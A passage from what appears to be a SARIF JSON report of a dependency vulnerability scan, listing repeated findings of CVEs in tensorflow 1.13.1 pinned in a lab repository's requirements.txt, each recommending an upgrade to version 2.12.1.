            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2021-29602 (severity: low, fixed in 2.4.2)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2021-29602](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29602)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "5d81be898007a232b7bf77642612bd5654452cbb"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2021-29575",
          "ruleIndex": 159,
          "level": "note",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2021-29575 (severity: low, fixed in 2.4.2)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2021-29575](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29575)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "ac6b52853ce89dc89aa2cf25280cab2765062f8c"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2021-29518",
          "ruleIndex": 160,
          "level": "note",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2021-29518 (severity: low, fixed in 2.4.2)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2021-29518](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29518)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "61ef94313f4e582a1a5f9d6d968a132cd7db16fb"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2021-29555",
          "ruleIndex": 161,
          "level": "note",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2021-29555 (severity: low, fixed in 2.4.2)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2021-29555](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29555)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "e64ad9fcd25e409ce62c85b4bdb7169219190ee5"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2021-29612",
          "ruleIndex": 162,
          "level": "note",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2021-29612 (severity: low, fixed in 2.4.2)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2021-29612](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29612)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "0eded00338beed7f3bef996ee0dc57522611ab7c"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2021-29543",
          "ruleIndex": 163,
          "level": "note",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2021-29543 (severity: low, fixed in 2.4.2)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2021-29543](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29543)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "8d0a63292d321fc4cf99d69726a8a2d4f7d2d2cc"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2021-29590",
          "ruleIndex": 164,
          "level": "note",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2021-29590 (severity: low, fixed in 2.4.2)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2021-29590](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29590)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "b7018f9f3c915dd73834f9bfe742edb899c5d5b1"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2021-29592",
          "ruleIndex": 165,
          "level": "warning",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2021-29592 (severity: medium, fixed in 2.4.2)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2021-29592](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29592)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "06b6c5ff6daaa58f773a1acfa89e39eb3e8faba1"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2021-29552",
          "ruleIndex": 166,
          "level": "note",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2021-29552 (severity: low, fixed in 2.4.2)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2021-29552](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29552)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "d577afbb91a4f0ccbd4e6335122d3d827848b804"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2021-29525",
          "ruleIndex": 167,
          "level": "note",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2021-29525 (severity: low, fixed in 2.4.2)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2021-29525](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29525)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "ce039a2351f06029c0a170479a8692665a0a1bd8"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2021-29560",
          "ruleIndex": 168,
          "level": "note",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2021-29560 (severity: low, fixed in 2.4.2)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2021-29560](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29560)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "179052868db5f3a518635ce2a5874b5b83be36a2"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2021-29580",
          "ruleIndex": 169,
          "level": "note",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2021-29580 (severity: low, fixed in 2.4.2)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2021-29580](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29580)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "73c7db3ba698af6bf27fadc3e3f310770f83b3a4"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2021-29538",
          "ruleIndex": 170,
          "level": "note",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2021-29538 (severity: low, fixed in 2.4.2)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2021-29538](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29538)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "1cd6f593bb3735681f7b13e94a34bf1fb02e84d7"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2021-29572",
          "ruleIndex": 171,
          "level": "note",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2021-29572 (severity: low, fixed in 2.4.2)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2021-29572](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29572)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "d9979fff2acef9ceb08d10632d913de382db4147"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2021-29573",
          "ruleIndex": 172,
          "level": "note",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2021-29573 (severity: low, fixed in 2.4.2)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2021-29573](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29573)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "05fabcaa3596e30cec3e6ecdabbe9e1212895267"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2021-29577",
          "ruleIndex": 173,
          "level": "note",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2021-29577 (severity: low, fixed in 2.4.2)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2021-29577](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29577)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "350e6e4f5c741604ede2535b9bcc17f8664e63ba"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2021-29556",
          "ruleIndex": 174,
          "level": "note",
          "message": {
